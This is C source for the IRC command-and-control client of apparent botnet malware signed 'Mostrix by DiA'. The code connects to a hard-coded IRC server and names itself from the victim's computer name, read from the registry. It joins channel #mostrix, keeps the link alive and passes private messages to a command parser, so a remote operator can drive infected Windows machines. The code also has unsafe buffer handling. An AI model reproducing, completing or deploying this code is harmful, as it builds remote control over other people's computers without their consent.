#include <windows.h>
#include <winsock2.h>
#include "CheckPrivMsg.h"
#include "ParseCommand.h"

void IrcClient(void);

void IrcClient(void)
{
	WSADATA			WSA;
	SOCKET			ConnectSock;
	SOCKADDR_IN		SockAddr;

	HKEY			RegHandle;
	char			ComputerName[100];
	DWORD			ComputerNameSize = sizeof(ComputerName);

	SYSTEMTIME		SystemTime;
	char			CurrentTime[5];

	char			Nick[100];
	char			User[100];

	char			NickStart[]		= "NICK ";
	char			UserStart[]		= "USER ";
	char			UserMiddle[]	= " 8 * : ";
	char			UserEnd[]		= " Mostrix\r\n";
	char			Break[]			= "\r\n";

	char			TmpCharBuff[1];
	char			CharBuff[2];
	char			LineBuff[200];
	char			ConnectedBuff[4];
	char			PingBuff[6];

	char			Join[] = "JOIN #mostrix\r\n";
	char			Pong[] = "PONG\r\n";
	char			Quit[] = "QUIT :Mostrix by DiA\r\n";

	char			CloseBuff[7];

	if(WSAStartup(MAKEWORD(2, 0), &WSA) == 0)
	{
		ConnectSock = socket(AF_INET, SOCK_STREAM, 0);

		if(ConnectSock != INVALID_SOCKET)
		{
			SockAddr.sin_family		 = AF_INET;
			SockAddr.sin_port		 = htons(6667);					//irc port 6667
			SockAddr.sin_addr.s_addr = inet_addr("140.211.166.4");	//server on irc.freenode.net

			if(connect(ConnectSock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != SOCKET_ERROR)
			{
				if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows Media\\WMSDK\\General", 0, KEY_QUERY_VALUE, &RegHandle) == ERROR_SUCCESS)
				{
					RegQueryValueEx(RegHandle, "ComputerName", 0, 0, (BYTE *)&ComputerName, &ComputerNameSize);
					RegCloseKey(RegHandle); // or just GetComputerNameA API :D, next version... lazy DiA!
				}
				else
				{
					lstrcpy(ComputerName, "Mostrix");
				}

				GetSystemTime(&SystemTime);

				if(GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &SystemTime, "HHmm", CurrentTime, sizeof(CurrentTime)) == 0)
				{
					lstrcpy(CurrentTime, "13");
				}

				lstrcat(ComputerName, CurrentTime); //Nick & Username

				lstrcpy(Nick, NickStart);
				lstrcat(Nick, ComputerName);
				lstrcat(Nick, Break);

				lstrcpy(User, UserStart);
				lstrcat(User, ComputerName);
				lstrcat(User, UserMiddle);
				lstrcat(User, ComputerName);
				lstrcat(User, UserEnd);

				if(send(ConnectSock, Nick, lstrlen(Nick), 0) != SOCKET_ERROR)
				{
					if(send(ConnectSock, User, lstrlen(User), 0) != SOCKET_ERROR)
					{
						while(lstrcmp(ConnectedBuff, "004") != 0)
						{
							do
							{
								recv(ConnectSock, TmpCharBuff, 1, 0);

								lstrcpyn(CharBuff, TmpCharBuff, 2);
								lstrcat(LineBuff, CharBuff);
							} while(lstrcmp(CharBuff, "\n") != 0);

							lstrcpyn(ConnectedBuff, LineBuff + 20, 4);

							if(lstrcmp(ConnectedBuff, "433") == 0)
							{
								closesocket(ConnectSock);
								WSACleanup();

								Sleep(60000); //wait 1 minute
								IrcClient();  //try to connect again with other nick
								return;       //close this IrcClient()
							}

							memset(&LineBuff, 0, sizeof(LineBuff));
						}

						if(send(ConnectSock, Join, lstrlen(Join), 0) != SOCKET_ERROR)
						{
							memset(&LineBuff, 0, sizeof(LineBuff));

							while(lstrcmp(CharBuff, "") != 0)
							{
								do
								{
									recv(ConnectSock, TmpCharBuff, 1, 0);

									lstrcpyn(CharBuff, TmpCharBuff, 2);
									lstrcat(LineBuff, CharBuff);
								} while(lstrcmp(CharBuff, "\n") != 0);

								lstrcpyn(PingBuff, LineBuff, 5);

								if(lstrcmp(PingBuff, "PING") == 0)
								{
									send(ConnectSock, Pong, lstrlen(Pong), 0);
								}

								if(CheckPrivMsg(LineBuff) == true)
								{
									lstrcpyn(CloseBuff, LineBuff + lstrlen(LineBuff) - 7, 6);

									if(lstrcmp(CloseBuff, "close") == 0)
									{
										send(ConnectSock, Quit, lstrlen(Quit), 0);
										closesocket(ConnectSock);
										WSACleanup();
										return;
									}

									ParseCommand(LineBuff);
								}

								memset(&LineBuff, 0, sizeof(LineBuff));
							}
						}
					}
				}		
			}

			closesocket(ConnectSock);
		}

		WSACleanup();
	}

	return;
}